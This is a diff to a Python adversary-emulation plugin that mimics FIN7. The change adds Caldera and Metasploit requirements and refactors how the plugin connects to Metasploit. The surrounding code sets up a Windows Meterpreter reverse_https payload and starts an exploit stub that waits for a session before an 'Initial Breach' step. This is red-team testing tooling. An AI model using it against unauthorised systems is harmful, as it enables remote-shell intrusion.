@@ -3,7 +3,7 @@
 # Adversary emulation for FIN7
 import socket
 
-from plugins.base.attack import AttackPlugin
+from plugins.base.attack import AttackPlugin, Requirement
 from app.interface_sfx import CommandlineColors
 from app.metasploit import MSFVenom, MetasploitInstant
 import os
@@ -20,6 +20,8 @@ class FIN7Plugin(AttackPlugin):
 
     required_files_attacker = []    # Files shipped with the plugin which are needed by the kali tool. Will be copied to the kali share
 
+    requirements = [Requirement.CALDERA, Requirement.METASPLOIT]
+
     ######
     payload_type_1 = "windows/x64/meterpreter/reverse_https"  # payload for initial stage
 
@@ -33,14 +35,15 @@ class FIN7Plugin(AttackPlugin):
 
         @param payload: payload description. waiting for this payload. Like "windows/x64/meterpreter/reverse_https"
         """
-        if self.metasploit_1:
-            return self.metasploit_1
+        if self.metasploit:
+            return self.metasploit
 
-        self.metasploit_1 = MetasploitInstant(self.metasploit_password, attack_logger=self.attack_logger, attacker=self.attacker_machine_plugin, username=self.metasploit_user)
+        self.connect_metasploit()
+
         ip = socket.gethostbyname(self.attacker_machine_plugin.get_ip())
-        self.metasploit_1.start_exploit_stub_for_external_payload(payload=self.payload_type_1, lhost=ip)
-        self.metasploit_1.wait_for_session()
-        return self.metasploit_1
+        self.metasploit.start_exploit_stub_for_external_payload(payload=self.payload_type_1, lhost=ip)
+        self.metasploit.wait_for_session()
+        return self.metasploit
 
     def step1(self):
         self.attack_logger.vprint(f"{CommandlineColors.OKBLUE}Step 1 (target hotelmanager): Initial Breach{CommandlineColors.ENDC}", 1)
